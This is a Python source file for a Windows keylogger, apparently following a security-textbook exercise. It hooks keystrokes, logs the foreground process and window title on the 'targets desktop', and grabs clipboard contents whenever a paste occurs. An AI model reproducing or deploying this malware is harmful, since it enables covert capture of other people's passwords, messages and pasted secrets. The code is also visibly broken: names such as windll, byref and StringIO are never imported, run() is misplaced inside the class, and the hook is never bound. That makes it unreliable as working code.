#!/usr/bin/env python3


import io
import ctypes
import os
import pythoncom
import pyWinhook as pyHook
import pywin32_system32
import sys
import time
import win32clipboard

"""Set a timer 
   in seconds by
   defining a constant
   name TIMEOUT,
   with the value 
   initialized as
   60*10"""
TIMEOUT = 60 * 10


class KeyLogger:
    """Define and initialize
     a KeyLogger class
     with one variable,
     current_window, with
     the default value set to
     None.
     """

    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        """Capture the active window
        and its associated process ID,
        GetForeGroundWindow returns
        a handle to the active window
        on the targets desktop,
        pass the handle to GetWindowThreadProcessId
        to retrieve PID.
        Open process, get PID, get
        .exe name of process,
        Grab full text using GetWindowTextA,
        """
        hwnd = windll.user32.GetForeGroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable, 512))
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        """Bind the key-down event
        to the KeyLogger method mykeystroke"""
        if event.Windowname != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard(())
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

    def run():
        save_stdout = sys.stdout
        sys.stdout = StringIO()

        kl = KeyLogger()
        hm = pyHook.HookManager
        hm.HookKeyboard()
        while time.thread_time() < TIMEOUT:
            pythoncom.PumpWaitingMessages()
            log = sys.stdout.getvalue()
            sys.stdout = save_stdout
            return log
        if __name__ == '__main__':
            print(run())
            print('done.')











